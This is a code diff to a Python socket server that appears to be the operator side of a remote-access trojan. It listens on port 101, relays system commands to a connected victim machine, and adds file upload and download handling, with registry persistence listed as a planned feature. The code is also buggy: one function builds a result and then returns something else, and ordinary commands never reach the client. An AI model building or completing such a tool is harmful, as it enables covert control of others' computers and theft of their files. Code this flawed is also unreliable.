@@ -10,6 +10,7 @@ import socket
 import json
 import threading
 import re
+import os,sys
 
 HOST = lambda : '0.0.0.0'
 PORT = lambda : 101
@@ -46,23 +47,55 @@ class SocketHandler(threading.Thread):
         with open(file=path, mode='rb') as f:
             if f.readable():
                 data_to_send = f.readlines()
-                return ''.join(data_to_send)
+                filename = os.path.split(path)[-1]
+                datatosend = { filename : ''.join(data_to_send)}
+                return data_to_send
             else :
                 print('[-] file is not allowed to read?!?')
 
-    def exeCommand(self,cmnd):
+    def exeCommand(self,user_input):
         '''
             if cmnd is download after it waite to recv
             if cmnd is upload first send a signal then read the file and send it
             if cmnd is not none of these send the cmnd to do on clientside and recv answer
             ls, dir, uname, pwd, upload, download
             presistence(regadd)
-            print help
         '''
-        # TODO : depends on input command switch :
-        self.conn.sendall(cmnd)
-        return self.recv(1024)
+        cmnd = None
+        filename = None
 
+        if re.match(r'^\s*download\s+(?P<filename>\S+)\s*$',user_input):
+            cmnd = 'download'
+            filename = re.search(r'^\s*download\s+(?P<filename>\S+)\s*$',user_input).group('filename')
+
+        if re.match(r'^\s*upload\s+(?P<filename>\S+)\s*$',user_input):
+            cmnd = 'upload'
+            filename = re.search(r'^\s*upload\s+(?P<filename>\S+)\s*$',user_input).group('filename')
+
+        if cmnd == 'download':
+            cmnd = 'download ' + filename
+            self.conn.sendall(cmnd) # here just the file name is enough
+            self.saveFile(jsondata=self.conn.recv(1024),filename=filename)
+            # client should send a jsondata dict : {filename : "binary data"}
+        elif cmnd == 'upload' :
+            filename = os.path.split(filename)[-1]
+            cmnd = 'upload ' + filename
+            self.conn.sendall(cmnd)
+            self.conn.sendall(self.upload(filename))
+        elif cmnd != None :
+            self.conn.sendall(cmnd)
+            return self.recv(1024)
+        else :
+            help_string = '''
+    you are in session part.
+    you can run all system commands(based on OS)
+        ls : list the file
+        help : list all commands you can run
+        upload : uploadig a file (after upload command you should write the exact filepath)
+        download : downloading a file from client box in current dir
+        
+            '''
+            print(help_string)
     def disconnect(self):
         self.leave = True
 
